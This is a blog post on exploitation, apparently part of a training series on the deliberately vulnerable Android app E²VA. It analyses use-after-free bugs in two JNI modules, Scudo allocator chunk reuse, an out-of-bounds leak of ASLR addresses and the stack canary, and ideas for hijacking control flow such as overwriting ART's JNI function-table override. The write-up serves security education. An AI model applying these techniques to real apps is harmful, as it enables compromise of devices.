---
title: "E²VA: Use After Free Write/Execute Module (Part 4)"
date: 2024-07-24T16:46:21+01:00
author: "Pascal Kühnemann"
draft: false
authorTwitter: "" #do not include @
cover: ""
tags: ["Android", "Binary Exploitation", "JNI", "E²VA", "Use After Free", "Memory Leak"]
keywords: ["Android", "Binary Exploitation", "JNI", "E²VA", "Use After Free", "Memory Leak"]
description: ""
showFullContent: false
readingTime: true
---

# Exploitation of *Use - After - Free* Modules

In this post we will be discussing how to exploit a *Use - After - Free* bug in both *UseAfterFreeExecModule* and *UseAfterFreeWriteModule*. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in *UseAfterFreeExecModule* we will be able to control a function pointer, whereas in *UseAfterFreeWriteModule* we are given a *Write - What - Where* condition.

## About this post

Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about **failing** to exploit the *Use - After - Free* bug that enables a *Write - What - Where* condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the *UseAfterFreeWriteModule*, but it was too hard to start with, so I introduced *UseAfterFreeExecModule* and derived a technique that is applicable to both modules.

If you are not interested in reading about one of the core pillars of binary exploitation, i.e. **failure**, then feel free to skip to the [fun part](#coming-back-from-useafterfreeexecmodule) :)

## Assumptions

We will assume that we have successfully grabbed a copy of the `.apk` file of *damnvulnerableapp*. Also, we will **not** discuss how to unpack an `.apk` file, but rather assume that we have access to `libUseAfterFree(Exec/Write)Module.so` and the `UseAfterFree(Exec/Write)Module` class. If it is unclear how to get access to these components when only given an `.apk` file, read the previous blog posts first!

## Analysis baseline

As we have access to the `.apk` file, we can utilize [*jadx*](https://github.com/skylot/jadx) to get the source code of `UseAfterFreeExecModule`:
```Java
/* loaded from: classes10.dex */
public class UseAfterFreeExecModule extends VulnerableModule {
    private native byte[] lookupExamples(int i);

    private native byte[] storePair(byte[] bArr, long j);

    static {
        System.loadLibrary("UseAfterFreeExecModule");
    }

    public UseAfterFreeExecModule() {
        super(new UseAfterFreeExecModuleConfiguration());
    }

    @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule
    public void main() throws VulnerableModuleException {
        output("Key - Value Storage! Most secure in this field!".getBytes());
        while (true) {
            output("Send a number between 1 and 4 (0 to continue) to see one of four key name templates:".getBytes());
            int index = ByteBuffer.wrap(input()).getInt();
            if (index == 0) {
                break;
            }
            output(lookupExamples(index - 1));
        }
        while (true) {
            output("Please provide the key name (EXIT to end app): ".getBytes());
            byte[] name = input();
            if (new String(name).toUpperCase(Locale.ROOT).equals("EXIT")) {
                output("Terminating...".getBytes());
                return;
            }
            output("Please provide the key value: ".getBytes());
            long value = ByteBuffer.wrap(input()).getLong();
            byte[] result = storePair(name, value);
            output(result);
        }
    }
}
```
and `UseAfterFreeWriteModule`:
```Java
/* loaded from: classes10.dex */
public class UseAfterFreeWriteModule extends VulnerableModule {
	private native byte[] lookupExamples(int i);

	private native void storePair(byte[] bArr, long j);

	static {
		System.loadLibrary("UseAfterFreeWriteModule");
	}

	public UseAfterFreeWriteModule() {
		super(new UseAfterFreeWriteModuleConfiguration());
	}

	@Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule
	public void main() throws VulnerableModuleException {
		output("Key - Value Storage! Most secure in this field!".getBytes());
		while (true) {
			output("Send a number between 1 and 4 (0 to continue) to see one of four key name templates:".getBytes());
			int index = ByteBuffer.wrap(input()).getInt();
			if (index == 0) {
				break;
			}
			output(lookupExamples(index - 1));
		}
		while (true) {
			output("Please provide the key name (EXIT to end app): ".getBytes());
			byte[] name = input();
			if (new String(name).toUpperCase(Locale.ROOT).equals("EXIT")) {
				output("Terminating...".getBytes());
				return;
			}
			output("Please provide the key value: ".getBytes());
			long value = ByteBuffer.wrap(input()).getLong();
			storePair(name, value);
			output(("Successfully stored (" + new String(name) + ":" + value + ")!").getBytes());
		}
	}
}
```

In both cases, we can see that:
1. An arbitrary amount of integers can be passed to `lookupExamples`. There seem to be **no bounds checks**!
2. An arbitrary amount of *key - value* pairs can be stored using `storePair`. Notice that the *value* is an 8 - byte integer.

Now, for the shared - object files we can use [*Ghidra*](https://ghidra-sre.org/). Starting with `libUseAfterFreeExecModule.so` yields the (already beautified) code:
```C
jbyteArray
Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples
          (JNIEnv *env, jobject this, jint index)
{
	long lVar1;
	undefined4 length;
	jbyteArray array;
	long in_FS_OFFSET;
	char *examples [4];

	canary = *(long *)(in_FS_OFFSET + 0x28);
	examples[2]._0_4_ = PTR_s_topsecret_key_00101d40._0_4_;
	examples[2]._4_4_ = PTR_s_topsecret_key_00101d40._4_4_;
	examples[3]._0_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._0_4_;
	examples[3]._4_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._4_4_;
	examples[0]._0_4_ = PTR_s_amazing_key_00101d30._0_4_;
	examples[0]._4_4_ = PTR_s_amazing_key_00101d30._4_4_;
	examples[1]._0_4_ = PTR_s_secret_key_00101d38._0_4_;
	examples[1]._4_4_ = PTR_s_secret_key_00101d38._4_4_;
	length = __strlen_chk(examples[(int)index],0xffffffffffffffff);
	array = (*(*env)->NewByteArray)(env,(jsize)length);
	(*(*env)->SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index));
	
	if (*(long *)(in_FS_OFFSET + 0x28) == canary) {
		return array;
	}
					/* WARNING: Subroutine does not return */
	__stack_chk_fail();
}

jbyteArray
Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair
          (JNIEnv *env,jobject this,jbyteArray name,jlong value)
{
	uint resultLength;
	void *obj;
	object *keyValue;
	jsize nameLength;
	jbyte *nameBytes;
	jbyteArray array;
	long in_FS_OFFSET;
	uint len;
	char *result;
	jboolean iscopy;
	long canary;

	canary = *(long *)(in_FS_OFFSET + 0x28);
	obj = malloc(0x108);
	*(code **)((long)obj + 0x100) = FUN_00100c60;
	free(obj);
	keyValue = (object *)calloc(1,0x108);
	nameLength = (*(*env)->GetArrayLength)(env,name);
	len = (uint)nameLength;
	if (0x100 < len) {
		len = 0x100;
	}

	iscopy = '\0';
	nameBytes = (*(*env)->GetByteArrayElements)(env,name,&iscopy);
	__memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff);
	keyValue->value = value;
	result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0);
	resultLength = __strlen_chk(&result,0xffffffffffffffff);
	array = (*(*env)->NewByteArray)(env,(jsize)resultLength);
	(*(*env)->SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)&result);
	(*(*env)->ReleaseByteArrayElements)(env,name,nameBytes,JNI_ABORT);
	free(keyValue);
	if (*(long *)(in_FS_OFFSET + 0x28) == canary) {
		return array;
	}
					/* WARNING: Subroutine does not return */
	__stack_chk_fail();
}
```

As `UseAfterFreeExecModule#lookupExamples` and `UseAfterFreeWriteModule#lookupExamples` are basically the same (verfiy if not convinced), we will only consider `UseAfterFreeWriteModule#storePair`:
```C
void Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair
               (JNIEnv *env,jobject this,jarray key,jlong value)
{
	jlong **ptrList;
	object *keyValuePair;
	jsize keyLength;
	jbyte *keyBytes;
	long in_FS_OFFSET;
	uint reducedKeyLength;
	jboolean iscopy;
	long canary;

	canary = *(long *)(in_FS_OFFSET + 0x28);
	ptrList = (jlong **)malloc(0x108);
	free(ptrList);
	keyValuePair = (object *)malloc(0x108);
	keyLength = (*(*env)->GetArrayLength)(env,key);
	reducedKeyLength = (uint)keyLength;
	if (0x100 < reducedKeyLength) {
		reducedKeyLength = 0x100;
	}

	iscopy = '\0';
	keyBytes = (*(*env)->GetByteArrayElements)(env,key,&iscopy);
	__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff);
	**ptrList = value;
	(*(*env)->ReleaseByteArrayElements)(env,key,keyBytes,2);
	free(keyValuePair);
	if (*(long *)(in_FS_OFFSET + 0x28) == canary) {
		return;
	}
					/* WARNING: Subroutine does not return */
	__stack_chk_fail();
}
```

## Trying to get code execution in *UseAfterFreeWriteModule*

In this section various approaches of getting code execution in the *UseAfterFreeWriteModule* will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.

### Leaking data

As is often the case with secured binaries, we have to defeat *ASLR* by leaking some address. "Luckily", there is a function that is called as often as we want, which is called `lookupExamples` that contains the following code snippet:
```C
...
length = __strlen_chk(examples[(int)index],0xffffffffffffffff);
array = (*(*env)->NewByteArray)(env,(jsize)length);
(*(*env)->SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index));
...
return array;
```
There are two aspects to consider:
1. `index` is not checked for *out - of - bounds* access.
2. `(jbyte *)(examples + (int)index)` will result in the address of a string being copied into `array`. We know that `examples` is probably a string table, because `__strlen_chk` is called on `examples[(int)index]`.

Interestingly, the *out - of - bounds* access is **not** really usable, because it requires `examples[(int)index]` to be a valid pointer for `index >= 4`. But there is no need to read more pointers, as the lengths of the strings in `examples` determine the amount of bytes returned. Thus, for `index = 3`, the leaked value will contain at least one address, if not more (it is a pretty long string).

`lookupExamples` is called in a loop, where the user is asked for **1 - based** indices into the array:
```Java
while (true) {
	output("Send a number between 1 and 4 (0 to continue) to see one of four key name templates:".getBytes());
	int index = ByteBuffer.wrap(input()).getInt();
	if (index == 0) {
		break;
	}
	output(lookupExamples(index - 1));
}
```

When accessing `lookupExamples` by sending `1 <= index <= 4` we can get the following leaks:
```
[0]: 0x730b9b7a371e     --|
[1]: 0x730b9b7a372a       | --> from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so
[2]: 0x730b9b7a3710       |
[3]: 0x730b9b7a3735     --|
[4]: 0x730b993ba990     --> stack address: array of example strings
[5]: 0x2147eb93990de82b --> 8 byte canary
[6]: 0x730b993ba8c0     --> stack address: stored `rbp`
[7]: 0x730c0379ffac     --> `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000`
```

With the current leak, we get
1. Address in `libUseAfterFreeWriteModule.so` and therefore its base address
2. Address in `libart.so` and therefore its base address
3. Address on stack
4. Canary

Keep in mind that everytime *UseAfterFreeWriteModule* is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.

### The bug

Before showing how to fail to exploit the bug ... well what is the bug anyways? Terms like *Write - What - Where* condition have already been mentioned, so lets see the corresponding code:
```C
...
ptrList = (jlong **)malloc(0x108);
free(ptrList);
keyValuePair = (object *)malloc(0x108);
keyLength = (*(*env)->GetArrayLength)(env,key);
reducedKeyLength = (uint)keyLength;
if (0x100 < reducedKeyLength) {
	reducedKeyLength = 0x100;
}

iscopy = '\0';
keyBytes = (*(*env)->GetByteArrayElements)(env,key,&iscopy);
__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff);
**ptrList = value;
...
```
As can be seen, immediately after allocating memory for a `jlong*[33]`, the memory is freed. Then memory is allocated to hold a `struct object` (this was deduced from analysis in *Ghidra*; the name is chosen arbitrarily). Comparing both `malloc` calls reveals that both types of the two variables are of the same size. If `malloc` was to return the same chunk twice, whatever is stored in the first 8 bytes of the `keyBytes` would be interpreted as a pointer, to which we would write the `value`.

Knowing our beloved `dlmalloc` (the glibc's implementation of `malloc`), we can assume that `keyValuePair` will be assigned the same chunk as `ptrList`, right? I.e. `keyValuePair = ptrList`, where `ptrList` is a dangling pointer, because its memory has already been freed? Well ... the interesting thing is that it actually works, i.e. `keyValuePair = ptrList`, but this is **not due to dlmalloc**!

Lets confirm my statement with some disassembly. To that end, observe that `ptrList = *($rbp-0x58)` and `keyValuePair = *($rbp-0x60)`:
```
[1] gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair 
    ...
    0x0000730b9ed59a1a <+42>:	call   0x730b9ed59b80 <malloc@plt>
    0x0000730b9ed59a1f <+47>:	mov    QWORD PTR [rbp-0x58],rax   <--- result of first malloc
    0x0000730b9ed59a23 <+51>:	mov    rdi,QWORD PTR [rbp-0x58]
    0x0000730b9ed59a27 <+55>:	call   0x730b9ed59b90 <free@plt>
    0x0000730b9ed59a2c <+60>:	mov    edi,0x108
    0x0000730b9ed59a31 <+65>:	call   0x730b9ed59b80 <malloc@plt>
    0x0000730b9ed59a36 <+70>:	mov    QWORD PTR [rbp-0x60],rax   <--- result of second malloc
    ...
gef➤  x/1gx $rbp-0x58
    0x730b9c970828:	0x0000730cb77bb950
gef➤  x/1gx $rbp-0x60
    0x730b9c970820:	0x0000730cb77bb950

[2] gef➤  pipe vmmap | grep primary | grep cb77
    0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary]

[3] gef➤  disassemble malloc
Dump of assembler code for function malloc:
    0x0000730eb408fda0 <+0>:	push   r14
    0x0000730eb408fda2 <+2>:	push   rbx
    0x0000730eb408fda3 <+3>:	push   rax
    0x0000730eb408fda4 <+4>:	mov    r14,rdi
    0x0000730eb408fda7 <+7>:	mov    rax,QWORD PTR [rip+0x982a2]  # 0x730eb4128050 <__libc_globals+80>
    0x0000730eb408fdae <+14>:	test   rax,rax
    0x0000730eb408fdb1 <+17>:	jne    0x730eb408fdcb <malloc+43>
    0x0000730eb408fdb3 <+19>:	call   0x730eb40950f0 <scudo_malloc>
    0x0000730eb408fdb8 <+24>:	mov    rbx,rax
    0x0000730eb408fdbb <+27>:	test   rax,rax
    0x0000730eb408fdbe <+30>:	je     0x730eb408fdd0 <malloc+48>
    0x0000730eb408fdc0 <+32>:	mov    rax,rbx
    0x0000730eb408fdc3 <+35>:	add    rsp,0x8
    0x0000730eb408fdc7 <+39>:	pop    rbx
    0x0000730eb408fdc8 <+40>:	pop    r14
    0x0000730eb408fdca <+42>:	ret    
    0x0000730eb408fdcb <+43>:	call   QWORD PTR [rax+0x18]

[4] gef➤  p/x 0x982a2 + 0x0000730eb408fdae
    $1 = 0x730eb4128050
gef➤  x/1gx 0x730eb4128050
    0x730eb4128050 <__libc_globals+80>:	0x0000000000000000

[5] gef➤  disassemble scudo_malloc
Dump of assembler code for function scudo_malloc:
   0x0000730eb40950f0 <+0>:	push   rbx
   0x0000730eb40950f1 <+1>:	mov    rsi,rdi
   0x0000730eb40950f4 <+4>:	lea    rdi,[rip+0x9b5c5]        # 0x730eb41306c0 <_ZL9Allocator>
   0x0000730eb40950fb <+11>:	mov    ecx,0x10
   0x0000730eb4095100 <+16>:	xor    edx,edx
   0x0000730eb4095102 <+18>:	xor    r8d,r8d
   0x0000730eb4095105 <+21>:	call   0x730eb4094a20 <_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb>
   0x0000730eb409510a <+26>:	mov    rbx,rax
   0x0000730eb409510d <+29>:	test   rax,rax
   0x0000730eb4095110 <+32>:	je     0x730eb4095117 <scudo_malloc+39>
   0x0000730eb4095112 <+34>:	mov    rax,rbx
   0x0000730eb4095115 <+37>:	pop    rbx
   0x0000730eb4095116 <+38>:	ret    
   0x0000730eb4095117 <+39>:	call   0x730eb411a850 <__errno@plt>
   0x0000730eb409511c <+44>:	mov    DWORD PTR [rax],0xc
   0x0000730eb4095122 <+50>:	mov    rax,rbx
   0x0000730eb4095125 <+53>:	pop    rbx
   0x0000730eb4095126 <+54>:	ret    
```

Lets digest what we just witnessed:
1. Identifying the values of `ptrList` and `keyValuePair` and confirming that `ptrList = keyValuePair`
2. Checking where `ptrList` and `keyValuePair` point to. They are pointing to some *primary* location?
3. As we called `malloc` to allocate memory, we quickly check its disassembly and observe that there is a call to `scudo_malloc` in case there is a zero at `rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2`.
4. Verify that indeed `scudo_malloc` is called. Btw. if `rip + 0x982a2` pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of `malloc`.
5. Check implementation of `scudo_malloc`. It internally calls `scudo::Allocator<...>::allocate` (using [*c++filt*](https://man7.org/linux/man-pages/man1/c++filt.1.html) to demangle mangled names).

We can observe a similar behaviour for `free`, which winds up to call `scudo::Allocator<scudo::AndroidConfig, &(scudo_malloc_postinit)>::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long)`.

#### Introducing *Scudo*, the Allocator

[*Scudo*](https://source.android.com/docs/security/test/scudo) is an allocator that is used for all native code from Android 11 onwards. Its source code can be found [here](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/).

We are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that `ptrList = keyValuePair` was not a coincidence. To that end, I will only present small excerpts of code.

As seen [above](#the-bug), `scudo_malloc` calls [`scudo::Allocator<...>::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292). Analyzing the implementation reveals:
```C++
...
if (LIKELY(PrimaryT::canAllocate(NeededSize))) {
  ...
  Block = TSD->Cache.allocate(ClassId);
  ...
}
...
void *Ptr = reinterpret_cast<void *>(UserPtr);
void *TaggedPtr = Ptr;
...
return TaggetPtr;
```
`Ptr` is computed from `Block`, but that is irrelevant for now. Tracing `TSD->Cache.allocate(ClassId)` gets us to the [implementation](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70) we wanted to see:
```C++
void *allocate(uptr ClassId) {
  ...
  PerClass *C = &PerClassArray[ClassId];
  ...
  CompactPtrT CompactP = C->Chunks[--C->Count];
  ...
  return Allocator->decompactPtr(ClassId, CompactP);
}
```
Reversing the type definitions shows that `CompactPtrT = uintptr_t`, so its just a normal pointer. Finally, inspecting [`PerClass`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=135):
```C++
struct PerClass {
  u32 Count;    // <-- amount of free chunks in block
  u32 MaxCount; // <-- no idea
  uptr ClassSize; // <-- size of a single chunk in bytes
  CompactPtrT Chunks[2 * TransferBatch::MaxNumCached];  // <-- chunks, freed and used
};
```
Basically [`SizeClassAllocatorLocalCache::allocate(uptr ClassId)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70) will get the next free chunk by decreasing `PerClass::Count` by 1 and taking this as an index into `PerClass::Chunks`.

Similarly, for `scudo_free`, we end up running [`SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=88)(this is non - trivial to see, but is what actually happens):
```C++
void deallocate(uptr ClassId, void *P) {
  ...
  PerClass *C = &PerClassArray[ClassId];
  ...
  C->Chunks[C->Count++] = Allocator->compactPtr(ClassId, reinterpret_cast<uptr>(P));
  ...
}
```
This method frees a chunk by writing the compacted pointer back into the array and adding 1 to `PerClass::Count`. Therefore, the sequence
```C
  struct manager *m = (struct manager*)malloc(sizeof(struct manager));
  free(m);
  struct object *obj = (struct object*)malloc(sizeof(struct object));
```
results in decrementing `PerClass::Count` (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that `ptrList = keyValuePair`. Notice that there are probably optimizations in place that handle memory shortages etc. As *DamnVulnerableApp* is the only app I run on the emulator, it might differ from what you get on a busy device.

### Trying to exploit

Lets recall the setting we are in:
1. We are given a *Write - What - Where* condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (`.bss`, `.data`, `stack`, `heap`) are **not** executable.
2. We have access to `libart.so`, `libUseAfterFreeWriteModule.so`, the stack and the canary.

The *Goal*: Arbitrary Code Execution

#### Sniffing out function pointers

The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the *vtable* would allow to execute arbitrary functions that are *resistent* to `__thiscall`. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.

Unfortunately, *vtables* are located in a read - only section. This can be proven by observing that mangled *vtable* names start with "_ZTV". To be precise, only ["TV"](https://itanium-cxx-abi.github.io/cxx-abi/abi-mangling.html) indicates that this is a *vtable*. Next, analysing all publicly available *vtables*:
```bash
$ readelf --wide --symbols libart.so | grep "_ZTV"
...
 13121: 0000000000c17e18    32 OBJECT  WEAK   PROTECTED   16 _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE
$ readelf --wide --sections libart.so
  ...
  [16] .data.rel.ro      PROGBITS        0000000000c0aa40 80aa40 010b00 00  WA  0   0 16
  ...
```

Note that I might have missed a *vtable*, but this was enough to quit persuing the *vtable* - approach. If we were able to call `mprotect` on the *vtables*, maybe it could be possible to make the *vtables* writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for `mprotect`. Therefore, `__thiscall` is again a challenge.

Luckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of `JNIEnv` - function calls in a JNI function.

Observe that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via `artQuickGenericJniTrampoline` in assembly in `art_quick_generic_jni_trampoline`. The first parameter is [ALWAYS](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/entrypoints/quick/quick_trampoline_entrypoints.cc;l=1936;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9) of type `JNIEnv*`. The jni object is fetched via `Thread::GetJniEnv`, which returns an instance of `JNIEnvExt`.
```C++
class JniEnvExt : public JNIEnv {...}
...
#if defined(__cplusplus)
typedef _JNIEnv JNIEnv;
#else
typedef const struct JNINativeInterface* JNIEnv;
...
#endif
...
/*
 * C++ object wrapper.
 *
 * This is usually overlaid on a C struct whose first element is a
 * JNINativeInterface*.  We rely somewhat on compiler behavior.
 */
struct _JNIEnv {
    /* do not rename this; it does not seem to be entirely opaque */
    const struct JNINativeInterface* functions;
    ...
}
```
The definition of `_JNIEnv` comes from [here](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:libnativehelper/include_jni/jni.h;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;l=489). In structures, everything is public, therefore `functions` is visible in `JNIEnvExt`!

Then also observe that (see [code](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.h;l=165))
```c++
class JNIEnvExt : public JNIEnv {
    ...
    static const JNINativeInterface* table_override_ ...;
    ...
}
```
Using
```bash
$ readelf --wide --symbols libart.so | grep "_ZN3art9JNIEnvExt15table_override_E"
 3674: 0000000000e21cb8     8 OBJECT  GLOBAL PROTECTED   23 _ZN3art9JNIEnvExt15table_override_E
10840: 0000000000e21cb8     8 OBJECT  GLOBAL PROTECTED   23 _ZN3art9JNIEnvExt15table_override_E
$ readelf --wide --sections libart.so | grep .bss
  [23] .bss              NOBITS          0000000000e1fbe0 81fbe0 003bb0 00  WA  0   0 16
```
yields that `JNIEnvExt::table_override` is part of `.bss`, which again implies that we can overwrite this pointer with the *Write - What - Where* condition.

We can try to link both of the above together via [`GetFunctionTable`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;bpv=0;bpt=1;l=318)
```C++
const JNINativeInterface* JNIEnvExt::GetFunctionTable(bool check_jni) {
  const JNINativeInterface* override = JNIEnvExt::table_override_;
  if (override != nullptr) {
    return override;
  }
  return check_jni ? GetCheckJniNativeInterface() : GetJniNativeInterface();
}
```

and either [`ThreadResetFunctionTable`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1)
```C++
void ThreadResetFunctionTable(Thread* thread, void* arg ATTRIBUTE_UNUSED)
    REQUIRES(Locks::jni_function_table_lock_) {
  JNIEnvExt* env = thread->GetJniEnv();
  bool check_jni = env->IsCheckJniEnabled();
  env->functions = JNIEnvExt::GetFunctionTable(check_jni);
  env->unchecked_functions_ = GetJniNativeInterface();
}
```

or [`SetCheckJniEnabled`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=118)
```C++
void JNIEnvExt::SetCheckJniEnabled(bool enabled) {
  check_jni_ = enabled;
  MutexLock mu(Thread::Current(), *Locks::jni_function_table_lock_);
  functions = GetFunctionTable(enabled);
  // Check whether this is a no-op because of override.
  if (enabled && JNIEnvExt::table_override_ != nullptr) {
    LOG(WARNING) << "Enabling CheckJNI after a JNIEnv function table override is not functional.";
  }
}
```

So if either of the above functions was called with a modified `JNIEnvExt::override_table_`, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets...

Notice that [`ThreadResetFunctionTable`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1) is a callback invoked inside a [`foreach` - method](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=301), i.e.
```C++
void JNIEnvExt::SetTableOverride(const JNINativeInterface* table_override) {
  MutexLock mu(Thread::Current(), *Locks::thread_list_lock_);
  MutexLock mu2(Thread::Current(), *Locks::jni_function_table_lock_);

  JNIEnvExt::table_override_ = table_override;

  // See if we have a runtime. Note: we cannot run other code (like JavaVMExt's CheckJNI install
  // code), as we'd have to recursively lock the mutex.
  Runtime* runtime = Runtime::Current();
  if (runtime != nullptr) {
    runtime->GetThreadList()->ForEach(ThreadResetFunctionTable, nullptr);
    // Core Platform API checks rely on stack walking and classifying the caller. If a table
    // override is installed do not try to guess what semantics should be.
    runtime->SetCorePlatformApiEnforcementPolicy(hiddenapi::EnforcementPolicy::kDisabled);
  }
}
```
which seems to be free of any references to `this`. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is "crash - resistent"... Also, in order to create a copy of that function pointer table, we would need to write at least `sizeof (struct JNINativeInterface) = 0x748 bytes`, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.

#### Alternative idea for exploitation of *UseAfterFreeWriteModule*

There is a symbol called `execv` in the symbol table of `libart.so`, whose value is `0`. Thus there is a `.plt` entry for this function. According to an experiment, the following code runs without an error in the emulator:
```C
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    execv("/bin/sh", NULL);

    return 0;
}
```
Therefore, only the first parameter needs to be a global variable. The second one can be `NULL`! But we **cannot** trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.

Seeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a *Write - What - Where* condition to an *Execute* condition.

## Exploitation of *UseAfterFreeExecModule*

The issue with this module is not just the leak (which is the same as in *UseAfterFreeWriteModule*), but also the implementation of the key - value storage function:
```C
...
obj = malloc(0x108);
*(code **)((long)obj + 0x100) = FUN_00100c60;
free(obj);
keyValue = (object *)calloc(1,0x108);
nameLength = (*(*env)->GetArrayLength)(env,name);
len = (uint)nameLength;
if (0x100 < len) {
	len = 0x100;
}

iscopy = '\0';
nameBytes = (*(*env)->GetByteArrayElements)(env,name,&iscopy);
__memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff);
keyValue->value = value;
result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0);
resultLength = __strlen_chk(&result,0xffffffffffffffff);
array = (*(*env)->NewByteArray)(env,(jsize)resultLength);
(*(*env)->SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)&result);
...
```
In itself, only the fact that `obj` is reused to call the function at `obj + 0x100` seems to be an issue. Seeing that `malloc(0x108)` and `calloc(1, 0x108)` both allocate `0x108` bytes, we can deduce (just as [before](#introducing-scudo-the-allocator)) that the same chunk is returned.

Now we just have to exploit this...

### Finding a better *obj + 0x100*

From [the first section](#leaking-data) we get a bunch of pointers. E.g. this might look like this:
```
[0]: 0x730b9d3c874e     <-- ptr: "amazing_key"
[1]: 0x730b9d3c875a     <-- ptr: "secret_key"
[2]: 0x730b9d3c8740     <-- ptr: "topsecret_key"
[3]: 0x730b9d3c8765     <-- ptr: "a_very_very_long_key_with_fancy_features_:D"
[4]: 0x730b9afdf9a0     <-- stack address: most likely examples
[5]: 0x2147eb93990de82b <-- looks more like a canary
[6]: 0x730b9afdf8d0     <-- stack address: stored rbp
[7]: 0x730c0379ffac     <-- return address
```
The first five addresses can be understood if one analyses `lookupExamples`. The canary is often just a [random 8 - byte value](https://link.springer.com/article/10.1007/s10207-018-00425-8) that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a [random canary](https://link.springer.com/article/10.1007/s10207-018-00425-8). Disassembling `lookupExamples` yields
```
gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples 
    0x0000730b9d3c8990 <+0>:	push   rbp
    0x0000730b9d3c8991 <+1>:	mov    rbp,rsp
    0x0000730b9d3c8994 <+4>:	sub    rsp,0x70
    0x0000730b9d3c8998 <+8>:	mov    rax,QWORD PTR fs:0x28
    0x0000730b9d3c89a1 <+17>:	mov    QWORD PTR [rbp-0x8],rax 
    ...
```
and therefore the stack layout is as described above.

